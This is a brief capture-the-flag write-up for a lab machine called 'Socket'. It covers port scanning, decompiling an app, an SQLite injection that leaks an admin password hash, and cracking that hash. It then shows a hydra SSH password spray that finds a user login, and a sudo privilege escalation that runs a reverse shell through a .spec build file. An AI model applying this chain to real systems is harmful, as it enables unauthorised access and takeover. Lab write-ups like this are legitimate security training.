# Socket

## IP = 10.10.11.206

### Nmap
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.1.2 Python/3.10.6
|_http-title: Site doesn't have a title (text/html; charset=utf-8)
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5789/tcp open  unknown
```

### Download app, sample qrcode: kavigihan
### Decompile the code
https://github.com/zrax/pycdc

### SQLite Injection
{"message": {"id": "admin", "version": "0c090c365fa0559b151a43e0fea39710", "released_date": null, "downloads": null}}

Crackstation (md5)
__password__: denjanjade122566

### Thomas Keller in the "reports"
Using username-anarchy, generate possiblw usernamers
```
# /opt/username-anarchy/username-anarchy thomas keller > usernames.txt              
# hydra -L usernames.txt -p denjanjade122566 10.10.11.206 ssh
[22][ssh] host: 10.10.11.206   login: tkeller   password: denjanjade122566
```

### `tkeller:denjanjade122566`, user.txt


### sudo -l
```
Matching Defaults entries for tkeller on socket:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tkeller may run the following commands on socket:
    (ALL : ALL) NOPASSWD: /usr/local/sbin/build-installer.sh
```

### easy privesc
1. Revshell in `rev.spec`
2. Execute: `sudo /usr/local/sbin/build-installer.sh build rev.spec`

### root.txt